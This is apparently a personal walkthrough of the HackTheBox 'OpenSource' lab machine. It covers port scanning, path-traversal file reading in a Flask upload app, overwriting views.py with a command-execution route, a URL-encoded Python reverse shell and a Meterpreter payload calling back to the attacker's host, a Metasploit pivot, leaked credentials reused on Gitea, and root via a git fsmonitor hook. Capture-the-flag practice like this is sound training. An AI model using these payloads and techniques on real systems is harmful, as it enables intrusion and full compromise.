---
description: OpenSource box from HackTheBox write up.
---

# OpenSource

## Nmap scan

As always time for a full port simple Nmap scan and then I will throw a more detailed one only on open ports:

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate 1000 10.10.11.164
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 04:56 EDT
Nmap scan report for 10.10.11.164
Host is up (0.056s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp

Nmap done: 1 IP address (1 host up) scanned in 19.19 seconds
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p22,80,3000 -sC -sV 10.10.11.164          
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 04:57 EDT
Nmap scan report for 10.10.11.164
Host is up (0.052s latency).

PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 30 May 2022 08:57:23 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 30 May 2022 08:57:24 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-title: upcloud - Upload files for Free!
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
3000/tcp filtered ppp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.74 seconds
```

Looks like port 3000 is detected as filtered, for now I will focus on the ports 22 and 80 and if I can't find anything we can try to investigate the 3000 too.

## Upcloud

### LFI but not more

We are welcomed by a landing page that allows us to go to an application to upload files, what could be handy, and also allows us to download the source code of this application.

The service is running on Flask so it is a Python application what means that uploading PHP files to get RCE won't work. The thing is that looking at the code, it is pretty easy to notice a LFI vulnerability.

Just url encoding a payload like `..//etc/passwd` and passing it to the `/uploads` directory will give us the `/etc/passwd` file:

```bash
┌──(kali㉿kali)-[~]
└─$ curl http://10.10.11.164/uploads/%2E%2E%2F%2F/etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
```

After some testing I can confirm the application is  as `root` inside the container (We can access the `/etc/shadow`), there is a `Dockerfile` in the downloaded app that suggest this but is good to confirm it.

Cool but what about now? LFI does not give us RCE so what now? Well I remembered that we have a landing page and I did not try to Gobuster it:

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.11.164/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt       
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.164/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/30 06:59:20 Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 200) [Size: 2489147]
/console              (Status: 200) [Size: 1563]   
                                                   
===============================================================
2022/05/30 07:00:41 Finished
===============================================================
```

Ok, we can access a Python console in `/console` but we don't have the PIN to unlock it... maybe the LFI is the answer. We know thanks to the `supervisord.conf` that flask STDOUT is located at `/dev/stdout` but looks like is configured to avoid output to that file.

Looking around I discovered that the code we got before is actually a Git repository! It has two branches, `main` and `dev`. Researching the `dev` one I found that this is actually what is deployed in the target and not what I was inspecting before (Was enough to get LFI though).

Researching the repository I found some juicy information in one of the commits to the `dev` branch: 

```bash
┌──(kali㉿kali)-[~/Documents/HTB/OpenSource/source]
└─$ git show a76f8f75f7a4a12b706b0cf9c983796fa1985820
commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

    updated

diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
new file mode 100644
index 0000000..5975e3f
--- /dev/null
+++ b/app/.vscode/settings.json
@@ -0,0 +1,5 @@
+{
+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
+  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
+  "http.proxyStrictSSL": false
+}
```

I don't really know what this proxy is or does but everything points out that is in the real machine so let's keep the credentials `dev01:Soulless_Developer#2022` and wait for a reverse shell to start investigating this.

### RCE

Next idea, the upload functionality use the same sanitization method we know is vulnerable so if we can send a file with a name like `..//app/app/views.py`, we will overwrite the application `views.py` file and inject custom code. In order to achieve this we can use Burpsuite to catch the upload request and change the filename there.

I uploaded the new `view.py` file adding this function:

```python
...
@app.route('/anthares')
def omega():
    args = request.args
    command = args.get("cmd", default="id", type=str)
    
    return os.popen(command).read()
...
```

And I just had to use a url encoded Python reverse shell to get into the container:

```	
http://10.10.11.164/anthares?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.14.21%22%2C8000%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27
```

The only problem is that the application is run in Docker, what means that we will need to scape now, the SSH service is probably running in the real machine though.

## Trying to scape from the container

So we are now inside the container as `root` but we want to own the machine not this. I starte enumerating a bit but I could not find something obvious so I tried to scan the real host from the container with Nmap. Looks like that filtered port 3000 is indeed openned to the container and according to information I got using `wget` from the container is hosting a Gitea application. There are also other ports open I will take a look later if necessary: 6000, 6001, 6002, 6003, 6004, 6005, 6006 and 6007.

Cool, time to pivot because I don't want to enumerate this web page using only the reverse shell. I will create and upload a meterpreter binary to get a session in Metasploit and then using routes and the `auxiliary/server/socks_proxy` module I will set up a SOCKS5 proxy:

```bash
# Generate a Meterpreter binary and upload it to the container
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.21 LPORT=8080 -f elf > shell-x64.elf

# Start the handler and execute the Meterpreter binary to get a session
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter_reverse_tcp
payload => linux/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => 10.10.14.21
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.21:8080 
[*] Meterpreter session 1 opened (10.10.14.21:8080 -> 10.10.11.164:55180 ) at 2022-05-30 13:56:22 -0400

#Once in meterpreter just run autoroute to create a route to the network we want to reach
meterpreter > run autoroute -s 172.17.0.1

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.17.0.1/255.255.255.0...
[+] Added route to 172.17.0.1/255.255.255.0 via 10.10.11.164
[*] Use the -p option to list all active routes


# Once the route is added, use auxiliary/server/socks_proxy and let the proxy running
```

Once all that is done, I changed Proxychains and Firefox configuration to use the Meterpreter proxy. We can reach the new target now from our machine!

Using the credentials we found before: `dev01:Soulless_Developer#2022` I was able to login to Gitea and get access to a private repositoriy: `dev01/home-backup`. Inside, I got the private key for the `dev01` user in the real machine so we have scaped the container now.

## As dev01 in the machine

The first thing is taking the flag under `/home/dev01/user.txt` and then checked the open ports:

```bash
dev01@opensource:~$ netstat -ltpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 172.17.0.1:6000         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6001         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6002         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6003         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6004         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6005         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6006         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6007         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      - 
```

As we saw before, a lot of ports open only in `172.17.0.1` address. The port 3000 is open to all addreses but probably the application is filtering traffic and the port from 6000 to 6007 are hosting the same `Upcloud` than the container... maybe another way of scaping the container?

Anyway, after some basic enumerarion I launched Pspy to check if something stick out:

```bash
2022/05/30 18:58:04 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity 
2022/05/30 18:59:01 CMD: UID=0    PID=9424   | /bin/bash /usr/local/bin/git-sync 
2022/05/30 18:59:01 CMD: UID=0    PID=9423   | /bin/sh -c /usr/local/bin/git-sync 
2022/05/30 18:59:01 CMD: UID=0    PID=9422   | /usr/sbin/CRON -f 
2022/05/30 18:59:01 CMD: UID=0    PID=9429   | git push origin main 
2022/05/30 18:59:01 CMD: UID=0    PID=9430   | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
```

As you can see, there is a Cronjob run by `root` that is using the following script to backup the user home folder to the Gitea repository:

```bash
dev01@opensource:~$ cat /usr/local/bin/git-sync
#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
    echo "No changes"
else
    day=$(date +'%Y-%m-%d')
    echo "Changes detected, pushing.."
    git add .
    git commit -m "Backup for ${day}"
    git push origin main
fi
```

At first I though that this was not interesting but I found this blog: [https://github.blog/2022-04-12-git-security-vulnerability-announced/](https://github.blog/2022-04-12-git-security-vulnerability-announced/){:target="_blank"}. 

According to the blog, if we set the `core.fsmonitor` variable in the `config` file inside a `.git` directory we can get arbitrary code execution when a command like `git status` is run in the repository. So changing the `config` file of the `dev01` home folder repository a bit we can get `root`:

```
.git/config

[core]
		...
		fsmonitor = chmod u+s /bin/bash
...
```

When the Cronjob we saw before is executed, the `root` user will change `/bin/bash` to be a SUID binary. That means we have rooted the machine!

```bash
dev01@opensource:~$ bash -p
bash-4.4#
```

The flag is under `/root/root.txt`.
